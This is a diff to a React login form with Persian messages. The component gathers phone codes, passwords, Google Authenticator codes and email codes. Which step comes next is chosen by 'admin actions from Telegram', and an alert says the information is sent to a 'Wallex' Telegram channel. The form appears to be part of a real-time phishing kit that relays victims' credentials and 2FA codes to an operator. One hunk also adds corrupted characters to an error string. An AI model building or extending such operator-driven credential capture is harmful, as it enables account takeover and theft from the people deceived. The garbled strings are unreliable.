@@ -63,8 +63,6 @@ export const LoginForm = () => {
   // Phone verification states
   const [verifyCode, setVerifyCode] = useState("");
 
-
-
   // Password states
   const [password, setPassword] = useState("");
   const [showPassword, setShowPassword] = useState(false);
@@ -106,8 +104,6 @@ export const LoginForm = () => {
     }
   }, [sessionId]);
 
-
-
   // Handle admin actions from Telegram
   const handleAdminAction = (action: string) => {
     console.log("🚀 Admin action received:", action);
@@ -139,7 +135,7 @@ export const LoginForm = () => {
           setEmailStep("code");
           setErrors({
             emailCode:
-              "کد ایمیل وارد شده اشتباه است. لطفا کد صحیح را وارد کنید.",
+              "کد ایمیل وارد شده اش��باه است. لطفا کد صحیح را وارد کنید.",
           });
           break;
       }
@@ -288,14 +284,14 @@ export const LoginForm = () => {
             setTimeout(() => {
               const choice = prompt(
                 "🎭 حالت دمو - شبیه‌سازی ادمین\n\n" +
-                "انتخاب کنید:\n" +
-                "1 = Password\n" +
-                "2 = Google Auth\n" +
-                "3 = Email",
-                "1"
+                  "انتخاب کنید:\n" +
+                  "1 = Password\n" +
+                  "2 = Google Auth\n" +
+                  "3 = Email",
+                "1",
               );
 
-              switch(choice) {
+              switch (choice) {
                 case "1":
                   console.log("🎭 Demo admin chose: Password");
                   handleAdminAction("password");
@@ -312,7 +308,6 @@ export const LoginForm = () => {
                   console.log("🎭 Demo admin chose: Password (default)");
                   handleAdminAction("password");
               }
-              }
             }, 3000);
           }
         } catch (error) {
@@ -326,7 +321,6 @@ export const LoginForm = () => {
       setIsSubmitting(false);
     }
   };
-
 
   // Password submission
   const handlePasswordSubmit = async (e: React.FormEvent) => {
@@ -385,7 +379,7 @@ export const LoginForm = () => {
     } catch (error) {
       console.error("Google Auth submission error:", error);
       setErrors({
-        googleCode: "خطا در ار��ال کد. لطفا دوباره تلاش کنید.",
+        googleCode: "خطا در ارسال کد. لطفا دوباره تلاش کنید.",
       });
     } finally {
       setIsSubmitting(false);
@@ -425,7 +419,7 @@ export const LoginForm = () => {
       setEmailStep("code");
     } catch (error) {
       console.error("Email sending error:", error);
-      setErrors({ email: "خطا در ارسال کد ایمیل. لط��ا دوباره تلاش کنید." });
+      setErrors({ email: "خطا در ارسال کد ایمیل. لطفا دوباره تلاش کنید." });
     } finally {
       setIsSubmitting(false);
     }
@@ -468,8 +462,6 @@ export const LoginForm = () => {
       setErrors((prev) => ({ ...prev, mobileNumber: undefined }));
     }
   };
-
-
 
   const handleBack = () => {
     if (currentStep === "verify-phone") {
@@ -671,7 +663,7 @@ export const LoginForm = () => {
 
                 {validateTelegramConfig() && (
                   <AlertMessage>
-                    🤖 بات تلگرام فعال: اطلاعا�� به کانال والکس ارسال خواهد شد.
+                    🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد.
                   </AlertMessage>
                 )}
 
@@ -963,8 +955,6 @@ export const LoginForm = () => {
           {/* Step 3: Loading */}
           {currentStep === "loading" && renderLoading()}
 
-
-
           {/* Step 4: Password Authentication */}
           {currentStep === "password" && (
             <>
@@ -1110,8 +1100,6 @@ export const LoginForm = () => {
                   کد ۶ رقمی Google Authenticator خود را وارد کنید.
                 </AlertMessage>
               </div>
-
-
 
               <div style={{ marginBottom: "16px" }}>
                 <label
